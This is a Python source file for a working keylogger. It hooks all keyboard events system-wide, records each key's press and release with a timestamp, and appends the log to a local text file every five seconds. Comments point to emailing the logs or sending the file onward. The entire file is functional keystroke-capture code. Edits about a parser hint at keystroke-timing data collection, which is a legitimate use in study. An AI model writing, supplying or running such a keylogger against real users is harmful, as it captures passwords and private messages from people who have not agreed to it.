
import keyboard # for keylogs
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 5

#time now printed.
#reordered for "event, key, time"
#still prints repeat characters at the end of the string but This
#doesnt affect the time so it is ok - can remove it easily in the parser

class Keylogger:
    current_letter=''

    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""


    def callback(self, event):
        now = datetime.now().time()
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        eventtype = event.event_type

        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        print(f"current letter: {Keylogger.current_letter} ")

        if eventtype == "up":
            name = "\n" + "up," + name + "," + str(now)
        elif eventtype == "down" and Keylogger.current_letter != name:
            Keylogger.current_letter = name
            print(f"name: {name}")
            letter = name[0]
            name = "\n" + "down," + name + "," + str(now)

        # finally, add the key name to our global `self.log` variable
        self.log += name


    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        self.filename = "log"
        # open the file in write mode (create it)
        myfile = open(f"{self.filename}.txt", "a")
        # write the keylogs to the file
        myfile.write(self.log)
        print(f"[+] Saved {self.filename}.txt")
    #    myfile.close()



    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()


    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.hook(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()